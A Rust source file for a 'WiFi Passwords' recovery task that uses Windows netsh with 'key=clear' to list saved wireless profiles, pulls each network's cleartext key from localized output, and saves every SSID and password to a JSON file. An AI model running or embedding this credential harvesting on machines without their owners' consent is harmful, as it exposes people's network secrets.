use crate::recovery::{
    context::RecoveryContext,
    output::write_json_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use serde::Serialize;
use std::sync::Arc;
use tokio::process::Command;

pub fn wifi_task(_ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WifiRecoveryTask)
}

struct WifiRecoveryTask;

#[derive(Serialize)]
struct WifiSummary {
    networks: Vec<WifiNetwork>,
}

#[derive(Serialize)]
struct WifiNetwork {
    ssid: String,
    password: Option<String>,
}

#[async_trait]
impl RecoveryTask for WifiRecoveryTask {
    fn label(&self) -> String {
        "WiFi Passwords".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let profiles = get_wifi_profiles().await?;
        let mut networks = Vec::new();

        for ssid in profiles {
            let password = get_wifi_password(&ssid).await;
            networks.push(WifiNetwork { ssid, password });
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "wifi-passwords.json",
            &WifiSummary { networks },
        )
        .await?;

        Ok(vec![artifact])
    }
}

async fn get_wifi_profiles() -> Result<Vec<String>, RecoveryError> {
    let output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .await
        .map_err(|e| RecoveryError::Custom(format!("failed to execute netsh: {}", e)))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut profiles = Vec::new();

    for line in stdout.lines() {
        if let Some(pos) = line.find(':') {
            let profile = line[pos + 1..].trim().to_string();
            if !profile.is_empty() {
                profiles.push(profile);
            }
        }
    }

    Ok(profiles)
}

async fn get_wifi_password(ssid: &str) -> Option<String> {
    let output = Command::new("netsh")
        .args(["wlan", "show", "profile", ssid, "key=clear"])
        .output()
        .await
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        // "Key Content" is the label in English
        // We look for common labels across different locales or just the line containing the key
        if line.contains("Key Content") || line.contains("Contenu de la clé") || line.contains("Schlüsselinhalt") {
            if let Some(pos) = line.find(':') {
                return Some(line[pos + 1..].trim().to_string());
            }
        }
    }

    None
}
